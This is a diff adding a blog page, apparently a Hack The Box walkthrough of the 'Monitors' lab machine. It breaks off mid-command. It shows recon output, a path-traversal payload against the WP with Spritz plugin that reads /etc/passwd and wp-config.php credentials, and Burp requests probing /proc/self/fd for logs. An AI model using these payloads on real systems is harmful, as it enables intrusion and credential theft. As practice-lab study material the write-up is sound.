@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	24 Apr 2021IP:	10.10.10.238">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[Monitors]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/05/01/monitors/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	24 Apr 2021IP:	10.10.10.238">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1939.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1940.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1941.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1942.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1943.jpg">
+<meta property="article:published_time" content="2021-05-01T05:49:25.000Z">
+<meta property="article:modified_time" content="2021-10-10T04:33:53.479Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1939.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/05/01/monitors/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/05/01/monitors/","path":"2021/05/01/monitors/","title":"Hack-The-Box-walkthrough[Monitors]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[Monitors] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-80"><span class="nav-number">3.</span> <span class="nav-text">Port-80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-escalation"><span class="nav-number">4.</span> <span class="nav-text">Privilege escalation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">5.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">6.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/05/01/monitors/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[Monitors] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[Monitors]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-05-01 13:49:25" itemprop="dateCreated datePublished" datetime="2021-05-01T13:49:25+08:00">2021-05-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-10-10 12:33:53" itemprop="dateModified" datetime="2021-10-10T12:33:53+08:00">2021-10-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	Hard<br>Points:	40<br>Release:	24 Apr 2021<br>IP:	10.10.10.238</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1939.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/monitors]</span><br><span class="line">└─<span class="comment"># nmap -sV -p- -v --min-rate=10000 10.10.10.238</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>Let’s start with port-80</p>
+<h3 id="Port-80"><a href="#Port-80" class="headerlink" title="Port-80"></a>Port-80</h3><p>There is a simple html page that said direct IP is not allowed.</p>
+<p>Let’s add monitors.htb inside &#x2F;etc&#x2F;hosts file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/monitors]</span><br><span class="line">└─<span class="comment"># cat /etc/hosts                                                                                                                                </span></span><br><span class="line">127.0.0.1          localhost server.fatty.htb</span><br><span class="line">127.0.1.1          kali</span><br><span class="line">10.10.10.238       monitors.htb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The following lines are desirable for IPv6 capable hosts</span></span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s go to monitors.htb now.</p>
+<p>Wordpress is running on the server let’s run wpscan for find some users and vulnerabilities in plugin-ins.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+] wp-with-spritz</span><br><span class="line"> | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/</span><br><span class="line"> | Latest Version: 1.0 (up to <span class="built_in">date</span>)</span><br><span class="line"> | Last Updated: 2015-08-20T20:15:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 4.2.4 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt</span><br></pre></td></tr></table></figure>
+
+<p>Let’s search on google for exploit for this plugin-in.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDQ1NDQ=">WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Proof of Concept</span><br><span class="line"></span><br><span class="line">/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd</span><br><span class="line">/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec</span><br></pre></td></tr></table></figure>
+
+<p>Let’s go to this url and check this is vulnerable through LFI or not.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">\_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash</span><br><span class="line">Debian-snmp:x:112:115::/var/lib/snmp:/bin/false</span><br><span class="line">mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false</span><br></pre></td></tr></table></figure>
+
+<p>Now we known we can list the files so let’s get the wp-config.php.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../var/www/wordpress/wp-config.php</span><br><span class="line"></span><br><span class="line">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="line">/** The name of the database <span class="keyword">for</span> WordPress */</span><br><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wpadmin&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;BestAdministrator@2020!&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database Charset to use <span class="keyword">in</span> creating database tables. */</span><br><span class="line">define( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** The Database Collate <span class="built_in">type</span>. Don<span class="string">&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_COLLATE<span class="string">&#x27;, &#x27;</span><span class="string">&#x27; );</span></span><br></pre></td></tr></table></figure>
+
+<p>Got the username and password now let’s try to login with this creads.</p>
+<p>We can’t login with these creads. Now let’s try to get &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log.</p>
+<p>But we don’t have permission to list the access.log.</p>
+<p>After that i found an another way to list the access.log.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2Vjd3JpdGV1cHMuY29tL2J1Z2JvdW50eS1qb3VybmV5LWZyb20tbGZpLXRvLXJjZS1ob3ctYTY5YWZlNWEwODk5">BugBounty — “Journey from LFI to RCE!!!”-How I was able to get the same in one of the India’s popular property buy&#x2F;sell company.<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>After reading,the article I came to know that “&#x2F;proc&#x2F;self&#x2F;fd” provides symbolic shortcut to access-logs and various other system related file. So I tried reading those in search for access logs-</p>
+<p>I use burp for that.</p>
+<p>Capture the req and send it to intruder.</p>
+<ul>
+<li>request:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../proc/self/fd/1 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: monitors.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<p>Add the position.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../proc/self/fd/§1§ HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: monitors.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<p>Select payload type to numbers from 1 to 15 and start the attack.</p>
+<p>Check the maximum lenght on 10 payload.</p>
+<p>Now we list the access.log file let’s open this in browser.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1940.jpg"></li>
+</ul>
+<p>After analyze the file we see that a new vhost.</p>
+<p>Let’s check the &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf file for conform that.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/monitors]</span><br><span class="line">└─<span class="comment"># curl 